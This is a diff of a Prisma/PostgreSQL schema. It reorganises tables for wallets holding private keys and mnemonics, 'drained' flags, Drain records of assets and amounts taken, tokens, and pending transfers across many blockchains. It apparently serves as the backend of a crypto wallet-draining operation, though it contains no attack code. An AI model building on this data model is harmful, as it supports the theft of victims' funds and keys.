@@ -1,59 +1,82 @@
-generator client {
-  provider = "prisma-client-js"
-}
-
 datasource db {
-  provider = "postgresql"
   url      = env("DATABASE_URL")
+  provider = "postgresql"
 }
 
-model Drain {
-  id         Int         @id @default(autoincrement())
-  subNetwork SubNetwork?
-  asset      String
-  amount     Float
-  updatedAt  DateTime
-  createdAt  DateTime    @default(now()) @db.Date
-  walletId   Int
-  Wallet     Wallet      @relation(fields: [walletId], references: [id])
+generator client {
+  provider      = "prisma-client-js"
+  binaryTargets = ["darwin-arm64", "native", "linux-musl-openssl-3.0.x"]
+}
+
+enum Network {
+    Solana
+    TON
+    EVM
+}
+
+enum SubNetwork {
+    Eth
+    BNB
+    Avalanche
+    Cardano
+    Polygon
+    Optimism
+    Base
+    Arbitrum
+    Starknet
+    BobaNetwork
+    Tron
+    Fantom
+    TomoChain
+    zkSync
+    Cosmos
+    Blast
+    Harmony
+    Palm
 }
 
 model Wallet {
   id          Int       @id @default(autoincrement())
   network     Network
-  address     String?
+  address     String
   private_key String?
   mnemonic    String?
-  updatedAt   DateTime?
-  createdAt   DateTime  @default(now()) @db.Date
   drained     Boolean   @default(false)
   received    Boolean   @default(false)
-  Drain       Drain[]
+  updatedAt   DateTime  @updatedAt
+  createdAt   DateTime  @default(now()) @db.Date
+  drains      Drain[]
+  tokens      Token[]   
 }
 
-enum Network {
-  Solana
-  TON
-  EVM
+model Drain {
+  id          Int         @id @default(autoincrement())
+  subNetwork  SubNetwork?
+  asset       String
+  amount      Float
+  updatedAt   DateTime    @updatedAt
+  createdAt   DateTime    @default(now()) @db.Date
+  walletId    Int
+  wallet      Wallet      @relation(fields: [walletId], references: [id])
 }
 
-enum SubNetwork {
-  Eth
-  BNB
-  Avalanche
-  Cardano
-  Polygon
-  Optimism
-  Base
-  Arbitrum
-  Starknet
-  BobaNetwork
-  Tron
-  Fantom
-  TomoChain
-  zkSync
-  Cosmos
-  Blast
-  Harmony
-  Palm
+model Token {
+  id              Int         @id @default(autoincrement())
+  contractAddress String?
+  tokenId         String?
+  tokenName       String?
+  contract_type   String?
+  amount          String
+  network         SubNetwork
+  status          String     
+  walletId        Int
+  wallet          Wallet      @relation(fields: [walletId], references: [id])
+  createdAt       DateTime    @default(now())
+  updatedAt       DateTime    @updatedAt
+}
+
+model PendingTransfer {
+  id              Int         @id @default(autoincrement())
+  wallet_address String
+  token_address String
 }
